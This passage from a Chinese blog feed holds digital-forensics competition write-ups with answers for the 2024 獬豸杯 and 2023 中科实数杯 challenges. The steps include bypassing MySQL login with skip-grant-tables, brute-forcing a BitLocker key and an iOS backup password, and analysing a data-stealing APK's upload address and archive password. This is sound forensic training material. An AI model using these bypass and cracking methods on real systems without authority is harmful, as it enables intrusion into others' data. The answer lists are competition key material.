alt="image-20240129172053762"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291720743.png" alt="image-20240129172037698"></p><h4 id="2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）"><a href="#2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）" class="headerlink" title="2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）"></a>2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）</h4><p>这里还是不要用火眼数据库分析工具了 会不全 这里我们要恢复数据库 用这个文件夹覆盖我们本地小皮面板里面的<code>phpstudy_pro\Extensions\MySQL5.7.26\data</code>文件夹 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291819312.png" alt="image-20240129181924255"></p><p>稳妥起见 在<code>my.ini</code>中加上<code>skip-grant-tables</code>来绕过mysql登陆密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291821215.png" alt="image-20240129182124185"></p><p>在使用navicat连接本地数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291822799.png" alt="image-20240129182228758"></p><p>看到有5个数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291822440.png" alt="image-20240129182248420"></p><h4 id="3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）"><a href="#3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）" class="headerlink" title="3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）"></a>3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）</h4><p>在人员数据库的salaries_list表中使用sql语句进行查询</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291835071.png" alt="image-20240129183541039"></p><pre><code> 488313</code></pre><h4 id="4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）"><a href="#4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）" class="headerlink" title="4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）"></a>4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）</h4><pre><code>1486</code></pre><p>还是使用sql语句</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291856806.png" alt="image-20240129185651769"></p><h3 id="邮箱服务器"><a href="#邮箱服务器" class="headerlink" title="邮箱服务器"></a>邮箱服务器</h3><p>在计算机下载应用里面找到一个<code>hMailServer</code> 这应该就是邮箱服务器了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401292012799.png" alt="image-20240129201243760"></p><h4 id="1、请问邮箱服务器的登录密码是多少。（标准格式：admin）"><a href="#1、请问邮箱服务器的登录密码是多少。（标准格式：admin）" class="headerlink" title="1、请问邮箱服务器的登录密码是多少。（标准格式：admin）"></a>1、请问邮箱服务器的登录密码是多少。（标准格式：admin）</h4><pre><code>900110</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401300013406.png" alt="image-20240130001300369"></p><h4 id="2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）"><a href="#2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）" class="headerlink" title="2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）"></a>2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）</h4><pre><code>3</code></pre><p>这里从取证软件里面看会少一个 直接在hMailServer里面找 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401292351857.png" alt="image-20240129235112822"></p><h4 id="3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）"><a href="#3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）" class="headerlink" title="3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）"></a>3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）</h4><pre><code>3</code></pre><p>登陆邮件服务器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401300013359.png" alt="image-20240130001331304"></p><p>使用密码900110 打开Domains 看到三个域名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401300014031.png" alt="image-20240130001411983"></p><h4 id="4、请问约定见面的地点在哪里。（标准格式：太阳路668号）"><a href="#4、请问约定见面的地点在哪里。（标准格式：太阳路668号）" class="headerlink" title="4、请问约定见面的地点在哪里。（标准格式：太阳路668号）"></a>4、请问约定见面的地点在哪里。（标准格式：太阳路668号）</h4><pre><code>中国路999号</code></pre><p>misc做法 在邮件记录里面找到一个附件<code>待会见.jpg</code>  直接修改图片的宽高就可以看到在图片下方有见面地址</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282328465.png" alt="image-20240128232840426"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282328916.png" alt="image-20240128232852733"></p><h2 id="apk分析"><a href="#apk分析" class="headerlink" title="apk分析"></a>apk分析</h2><h4 id="1、APP包名是多少。（标准格式：com-xxx-xxx）"><a href="#1、APP包名是多少。（标准格式：com-xxx-xxx）" class="headerlink" title="1、APP包名是多少。（标准格式：com.xxx.xxx）"></a>1、APP包名是多少。（标准格式：com.xxx.xxx）</h4><pre><code>com.example.readeveryday</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291921364.png" alt="image-20240129192135281"></p><h4 id="2、apk的主函数名是多少。（标准格式：comlongxin）"><a href="#2、apk的主函数名是多少。（标准格式：comlongxin）" class="headerlink" title="2、apk的主函数名是多少。（标准格式：comlongxin）"></a>2、apk的主函数名是多少。（标准格式：comlongxin）</h4><pre><code>StartShow</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291923411.png" alt="image-20240129192309348"></p><h4 id="3、apk的签名算法是什么。（标准格式：xxx）"><a href="#3、apk的签名算法是什么。（标准格式：xxx）" class="headerlink" title="3、apk的签名算法是什么。（标准格式：xxx）"></a>3、apk的签名算法是什么。（标准格式：xxx）</h4><pre><code>SHA1withRSA</code></pre><p>这个其实在雷电的分析结果里面有 是<code>SHA1-RSA</code> 但还是以jadx的分析结果为准</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291927610.png" alt="image-20240129192746538"></p><h4 id="4、apk的应用版本是多少。（标准格式：1-2）"><a href="#4、apk的应用版本是多少。（标准格式：1-2）" class="headerlink" title="4、apk的应用版本是多少。（标准格式：1.2）"></a>4、apk的应用版本是多少。（标准格式：1.2）</h4><pre><code>1.0</code></pre><h4 id="5、请判断该apk是否需要联网。（标准格式：是-x2F-否）"><a href="#5、请判断该apk是否需要联网。（标准格式：是-x2F-否）" class="headerlink" title="5、请判断该apk是否需要联网。（标准格式：是&#x2F;否）"></a>5、请判断该apk是否需要联网。（标准格式：是&#x2F;否）</h4><pre><code>是</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291928207.png" alt="image-20240129192825171"></p><h4 id="6、APK回传地址？（标准格式：127-0-0-1-12345）"><a href="#6、APK回传地址？（标准格式：127-0-0-1-12345）" class="headerlink" title="6、APK回传地址？（标准格式：127.0.0.1:12345）"></a>6、APK回传地址？（标准格式：127.0.0.1:12345）</h4><pre><code>http://10.0.102.135:8888/api/demo</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291936089.png" alt="image-20240129193638046"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291937786.png" alt="image-20240129193700747"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291937800.png" alt="image-20240129193729740"></p><p>沙箱和雷电都分析出来一个内网地址 在jadx里面翻主函数的代码 也能找到一个<code>checkAndUpload</code>函数 在里面找到同样的地址</p><h4 id="7、APK回传数据文件名称是什么。（标准格式：1-txt）"><a href="#7、APK回传数据文件名称是什么。（标准格式：1-txt）" class="headerlink" title="7、APK回传数据文件名称是什么。（标准格式：1.txt）"></a>7、APK回传数据文件名称是什么。（标准格式：1.txt）</h4><pre><code>Readdata.zip</code></pre><p>接上题 在同样的函数里面找到这个文件</p><p>也可以使用雷电抓包看回传的文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302217534.png" alt="image-20240130221730474"></p><p>选择代理模式抓包 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302246956.png" alt="image-20240130224622886"></p><p>找到回传的文件名称</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302251601.png" alt="image-20240130225117514"></p><h4 id="8、APK回传数据加密密码是多少。（标准格式：admin）"><a href="#8、APK回传数据加密密码是多少。（标准格式：admin）" class="headerlink" title="8、APK回传数据加密密码是多少。（标准格式：admin）"></a>8、APK回传数据加密密码是多少。（标准格式：admin）</h4><pre><code>19_08.05r</code></pre><p>在<code>EncryFile</code>函数里面找到加密密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291940534.png" alt="image-20240129194032489"></p><h4 id="9、APK发送回后台服务器的数据包含以下哪些内容？（多选）"><a href="#9、APK发送回后台服务器的数据包含以下哪些内容？（多选）" class="headerlink" title="9、APK发送回后台服务器的数据包含以下哪些内容？（多选）"></a>9、APK发送回后台服务器的数据包含以下哪些内容？（多选）</h4><pre><code>A．手机通讯录B.手机短信C.相册D.GPS定位信息E.手机应用列表</code></pre><pre><code>ABE</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291945666.png" alt="image-20240129194512621"></p><p>分别对应 短信、通讯录、手机应用</p><p>也可以分析第7题抓包得到的压缩包 解压密码已经在第8题得到了 直接解压回传的<code>Readdata.zip </code>得到readdata.xml 这里面有提到通讯录、手机短信、应用列表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302255859.png" alt="image-20240130225514767"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024獬豸杯&quot;&gt;&lt;a href=&quot;#2024獬豸杯&quot; class=&quot;headerlink&quot; title=&quot;2024獬豸杯&quot;&gt;&lt;/a&gt;2024獬豸杯&lt;/h1&gt;&lt;h2 id=&quot;手机备份包&quot;&gt;&lt;a href=&quot;#手机备份包&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2023第四届中科实数杯</title>
    <link href="http://w3nx1z1.github.io/2024/01/13/2023%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF/"/>
    <id>http://w3nx1z1.github.io/2024/01/13/2023%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF/</id>
    <published>2024-01-12T16:29:53.586Z</published>
    <updated>2024-01-15T09:17:02.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023中科实数杯"><a href="#2023中科实数杯" class="headerlink" title="2023中科实数杯"></a>2023中科实数杯</h1><p>当时比赛在学校的训练馆里面 巨冷 直接被造成魔法伤害 还由于笔记本内存太小 火眼取证大师根本跑不动 导致最后时间很紧 队友爆出来bitlocker密钥的时候只剩20分钟了 sb答题系统还自动提交了我们答题少的那一台笔记本的答案 总之就是很憋屈的一场比赛(生理和心理上)</p><h2 id="案情介绍"><a href="#案情介绍" class="headerlink" title="案情介绍"></a>案情介绍</h2><pre><code>受害人报案，其被嫌疑人王某多次通过微信进行诈骗，对受害人手机进行快采后，公安机关根据已有线索，发现可能存在多个受害人被该嫌疑人通过同样的方式进行诈骗。公安机关现已将嫌疑人iphone手机、红米手机、电脑进行备份、镜像。检材1：嫌疑人的计算机磁盘镜像 检材2：嫌疑人的iphone备份数据 检材3：嫌疑人的计算机内存镜像 检材4：嫌疑人的红米手机备份数据</code></pre><h2 id="检材一：嫌疑人计算机"><a href="#检材一：嫌疑人计算机" class="headerlink" title="检材一：嫌疑人计算机"></a>检材一：嫌疑人计算机</h2><p>使用取证软件分析之后发现这个计算机镜像的C盘被锁了 基本上就是什么也取不出来 但是好在我们有内存文件</p><p>使用取证大师里面的内存镜像解析工具 解析一波bitlocker密码 很快就得到了bitlocker密钥文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401121857921.png" alt="image-20240112185721851"></p><p>使用密钥文件就可以在取证大师里面解密C盘 先进行取证 下面在使用passwordkit结合0计算机镜像和内存文件慢慢爆破bitlocker密钥</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401121859123.png" alt="image-20240112185911076"></p><h3 id="1-检材一硬盘的MD5值为"><a href="#1-检材一硬盘的MD5值为" class="headerlink" title="1.检材一硬盘的MD5值为"></a>1.检材一硬盘的MD5值为</h3><pre><code>80518BC0DBF3315F806E9EDF7EE13C12 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401121908962.png" alt="image-20240112190852922"></p><h3 id="2-检材一bitlocker的恢复密钥是多少？"><a href="#2-检材一bitlocker的恢复密钥是多少？" class="headerlink" title="2. 检材一bitlocker的恢复密钥是多少？"></a>2. 检材一bitlocker的恢复密钥是多少？</h3><p>使用passwordkit结合计算机镜像和内存镜像爆破出bitlocker密码为</p><pre><code>585805-292292-462539-352495-691284-509212-527219-095942</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122033157.png" alt="image-20240112203304074"></p><h3 id="3-检材一镜像中用户最近一次打开的文件名是什么？"><a href="#3-检材一镜像中用户最近一次打开的文件名是什么？" class="headerlink" title="3.检材一镜像中用户最近一次打开的文件名是什么？"></a>3.检材一镜像中用户最近一次打开的文件名是什么？</h3><p>使用爆破出的bitlocker密钥解密磁盘分区 使用取证工具进行分析</p><p>在火眼——最近访问的项目——筛选最后访问时间(按降序排列) </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122254418.png" alt="image-20240112225407340"></p><p>注意是最近一次打开的文件名 所以是第二行的<code>列表.xlsx</code></p><h3 id="4-检材一硬盘系统分区的起始位置？"><a href="#4-检材一硬盘系统分区的起始位置？" class="headerlink" title="4.检材一硬盘系统分区的起始位置？"></a>4.检材一硬盘系统分区的起始位置？</h3><pre><code>332398592</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122305799.png" alt="image-20240112230511764"></p><h3 id="5、检材一系统的版本号是多少（格式：x-x-x-x）（1分）"><a href="#5、检材一系统的版本号是多少（格式：x-x-x-x）（1分）" class="headerlink" title="5、检材一系统的版本号是多少（格式：x.x.x.x）（1分）"></a>5、检材一系统的版本号是多少（格式：x.x.x.x）（1分）</h3><pre><code>10.0.19042.508</code></pre><p>这道题还是官方wp写的方法更巧妙一点</p><p>我们在取证软件中看到的是<code>当前版本和当前build版本</code> 但这个并不全</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122308991.png" alt="image-20240112230834957"></p><p>但是题目的格式应该是有四位 那我们仿真起计算机 打开命令行就可以看到完整的系统版本号了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122329442.png" alt="image-20240112232959406"></p><h3 id="6、检材一回收站中的文件被删除前的路径（2分）"><a href="#6、检材一回收站中的文件被删除前的路径（2分）" class="headerlink" title="6、检材一回收站中的文件被删除前的路径（2分）"></a>6、检材一回收站中的文件被删除前的路径（2分）</h3><pre><code>C:/Users/rd/Desktop/iTunes(12.13.0.9).exe</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122330209.png" alt="image-20240112233030160"></p><h3 id="7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD-HH-MM-SS）（3分）"><a href="#7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD-HH-MM-SS）（3分）" class="headerlink" title="7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD HH:MM:SS）（3分）"></a>7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD HH:MM:SS）（3分）</h3><pre><code>2023-12-12 16:37:12</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122332543.png" alt="image-20240112233220464"></p><h3 id="8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><pre><code>2023-12-11 15:57:02</code></pre><p>在取证大师帐户登陆部分看到一个外部ip 那这就是远程连接的ip了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122338825.png" alt="image-20240112233820741"></p><h3 id="9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）"><a href="#9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）" class="headerlink" title="9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）"></a>9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）</h3><pre><code>常见的诈骗话术2023</code></pre><p>谷歌浏览器的搜索记录中筛选时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122341965.png" alt="image-20240112234107931"></p><h3 id="10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）"><a href="#10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）" class="headerlink" title="10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）"></a>10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）</h3><pre><code>FC2005927F271</code></pre><p>通过设备描述可以看出来只有aigo这个USB设备有挂载盘符 因此确定他是U盘 SN码就是设备序列号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122343246.png" alt="image-20240112234329173"></p><h3 id="11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）"><a href="#11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）" class="headerlink" title="11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）"></a>11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）</h3><pre><code>winrar-x64-624scp.exe</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122345049.png" alt="image-20240112234530962"></p><h3 id="12、嫌疑人访问的微博的密码的MD5值（3分）"><a href="#12、嫌疑人访问的微博的密码的MD5值（3分）" class="headerlink" title="12、嫌疑人访问的微博的密码的MD5值（3分）"></a>12、嫌疑人访问的微博的密码的MD5值（3分）</h3><pre><code>5cb42860b3b61ef6dd361ad556f48e05</code></pre><p>在谷歌浏览器中有保存微博账号登陆的密码 在进行md5加密即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122347382.png" alt="image-20240112234742310"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122347355.png" alt="image-20240112234758315"></p><h2 id="检材二：嫌疑人的iphone备份数据"><a href="#检材二：嫌疑人的iphone备份数据" class="headerlink" title="检材二：嫌疑人的iphone备份数据"></a>检材二：嫌疑人的iphone备份数据</h2><h3 id="13、检材二备份的设备名称是什么？（1分）"><a href="#13、检材二备份的设备名称是什么？（1分）" class="headerlink" title="13、检材二备份的设备名称是什么？（1分）"></a>13、检材二备份的设备名称是什么？（1分）</h3><pre><code>“User”的 iPhone</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131746598.png" alt="image-20240113174634555"></p><h3 id="14、检材二手机的IOS系统版本是多少（1分）"><a href="#14、检材二手机的IOS系统版本是多少（1分）" class="headerlink" title="14、检材二手机的IOS系统版本是多少（1分）"></a>14、检材二手机的IOS系统版本是多少（1分）</h3><pre><code>17.0</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131747999.png" alt="image-20240113174744955"></p><h3 id="15、检材二备份的时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（1分）"><a href="#15、检材二备份的时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（1分）" class="headerlink" title="15、检材二备份的时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（1分）"></a>15、检材二备份的时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（1分）</h3><pre><code>2023-12-09 15:02:28</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131752105.png" alt="image-20240113175248067"></p><h3 id="16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><p>在分析计算机镜像的时候 火眼识别出有一个ios的嵌套备份文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132203317.png" alt="image-20240113220317260"></p><p>我们跳转源文件 将这个备份提取出来 放到火眼里面在分析一下 提示是加密备份 需要密码</p><p>使用passwordkit进行爆破<code>Manifest.pslist</code>文件</p><p>爆破的范围我们在使用passwordkit分析内存镜像的时候可以看到是五位纯数字 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132217694.png" alt="image-20240113221736632"></p><p>最后爆破可得解密密钥为<code>25922</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132222482.png" alt="image-20240113222238398"></p><p>得到解密密钥之后 在火眼中进行解密在进行分析</p><p>找到通话记录 给号码“13502409024”最后一次打电话的时间是</p><pre><code>2023-12-04 13:18:50</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132236651.png" alt="image-20240113223657605"></p><h3 id="17、检材二使用过的号码ICCID是多少。（2分）"><a href="#17、检材二使用过的号码ICCID是多少。（2分）" class="headerlink" title="17、检材二使用过的号码ICCID是多少。（2分）"></a>17、检材二使用过的号码ICCID是多少。（2分）</h3><pre><code>89860000191997734908</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132238303.png" alt="image-20240113223800264"></p><h3 id="18、检材二手机中高德地图最后搜索的地址。（2分）"><a href="#18、检材二手机中高德地图最后搜索的地址。（2分）" class="headerlink" title="18、检材二手机中高德地图最后搜索的地址。（2分）"></a>18、检材二手机中高德地图最后搜索的地址。（2分）</h3><pre><code>万达广场(南沙店)双山大道3号</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131757076.png" alt="image-20240113175717029"></p><h3 id="19、检材二手机最后一次登陆-x2F-注册“HotsCoin”的时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分"><a href="#19、检材二手机最后一次登陆-x2F-注册“HotsCoin”的时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分" class="headerlink" title="19、检材二手机最后一次登陆&#x2F;注册“HotsCoin”的时间是（格式：YYYY-MM-DD HH:MM:SS）（2分)"></a>19、检材二手机最后一次登陆&#x2F;注册“HotsCoin”的时间是（格式：YYYY-MM-DD HH:MM:SS）（2分)</h3><pre><code>2023-12-04 13:28:14</code></pre><p>使用短信验证码登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132240226.png" alt="image-20240113224039190"></p><h3 id="20、检材二手机中照片“IMG-0002”的拍摄时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#20、检材二手机中照片“IMG-0002”的拍摄时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="20、检材二手机中照片“IMG_0002”的拍摄时间是（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>20、检材二手机中照片“IMG_0002”的拍摄时间是（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><pre><code>2023-12-06 11:08:30</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131757553.png" alt="image-20240113175751507"></p><h3 id="21、检材二中“小西米语音”app的Bundle-ID是什么？-（2分）"><a href="#21、检材二中“小西米语音”app的Bundle-ID是什么？-（2分）" class="headerlink" title="21、检材二中“小西米语音”app的Bundle ID是什么？ （2分）"></a>21、检材二中“小西米语音”app的Bundle ID是什么？ （2分）</h3><p>bundle id就是系统APP唯一识别id 其实就是app的包名</p><pre><code>com.titashow.tangliao</code></pre><h3 id="22、检材二中浏览器最后一次搜索的关键词是什么？（2分）"><a href="#22、检材二中浏览器最后一次搜索的关键词是什么？（2分）" class="headerlink" title="22、检材二中浏览器最后一次搜索的关键词是什么？（2分）"></a>22、检材二中浏览器最后一次搜索的关键词是什么？（2分）</h3><pre><code>ios备份密码忘了怎么办 五位纯数字</code></pre><p>Safari 的搜索记录保存在 <code>APP-Domain-com.apple.mobilesafari/Libarary/Preferences/com.apple.mobilesafari.plist</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142314680.png" alt="image-20240114231416643"></p><h3 id="23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）"><a href="#23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）" class="headerlink" title="23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）"></a>23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）</h3><pre><code>imToken、Bitcoin</code></pre><p>检材二中的微信聊天记录中并没有关于约定电子钱包的信息 在检材二这台苹果手机中下载的软件也只有UC浏览器 微信 高德地图 小西米语音 Hostcoin 那可以提供聊天记录的也就只有小西米语音了</p><p>小西米语音的聊天记录存放在<code>00008030-001619320C68802E\其他应用小西米语音—在线连麦社交平台\文件分类\SQLite文件\其他\im5db</code>中 我们使用navicat打开数据库 在<code>massage</code>表中可以看到聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142323868.png" alt="image-20240114232317815"></p><p>提到的电子钱包品牌是imToken和Bitcoin</p><h3 id="24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）"><a href="#24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）" class="headerlink" title="24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）"></a>24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）</h3><pre><code>0.2</code></pre><p>接上题  比例是0.2</p><h2 id="检材三：计算机内存镜像"><a href="#检材三：计算机内存镜像" class="headerlink" title="检材三：计算机内存镜像"></a>检材三：计算机内存镜像</h2><h3 id="25、检材三中进程“FTK-Imager-exe”的PID是多少？（2分）"><a href="#25、检材三中进程“FTK-Imager-exe”的PID是多少？（2分）" class="headerlink" title="25、检材三中进程“FTK Imager.exe”的PID是多少？（2分）"></a>25、检材三中进程“FTK Imager.exe”的PID是多少？（2分）</h3><pre><code>11328</code></pre><p>使用火眼的内存镜像分析工具</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132302766.png" alt="image-20240113230212675"></p><h3 id="26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><pre><code>2023-12-12 04:06:25</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132303631.png" alt="image-20240113230310542"></p><h3 id="27、检材三中记录的当前系统ip是多少？（2分）"><a href="#27、检材三中记录的当前系统ip是多少？（2分）" class="headerlink" title="27、检材三中记录的当前系统ip是多少？（2分）"></a>27、检材三中记录的当前系统ip是多少？（2分）</h3><pre><code>172.18.7.229</code></pre><p>使用取证大师的内存镜像解析工具分析内存镜像的网络连接情况 找到本地ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132312091.png" alt="image-20240113231203050"></p><h2 id="检材四：嫌疑人的红米手机备份数据"><a href="#检材四：嫌疑人的红米手机备份数据" class="headerlink" title="检材四：嫌疑人的红米手机备份数据"></a>检材四：嫌疑人的红米手机备份数据</h2><p>检材四是红米手机备份文件 给的文件夹里面有手机应用的备份bak文件还有一个综述性文件<code>descript.xml</code> 里面内容是备份应用和备份手机的相关信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141733567.png" alt="image-20240114173334496"></p><p>应用具体信息应该就在.bak文件中 使用7zip可以将这些bak文件解压 在解压后的文件夹中还可以找到对应app的安装包apk文件 类似下图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141813778.png" alt="image-20240114181324713"></p><p>将全部的应用bak文件使用7zip解压完毕 就可以将文件集合直接丢到火眼里面自动分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141814278.png" alt="image-20240114181425183"></p><h3 id="28、检材四中迅雷下载过的文件名是什么？（1分）"><a href="#28、检材四中迅雷下载过的文件名是什么？（1分）" 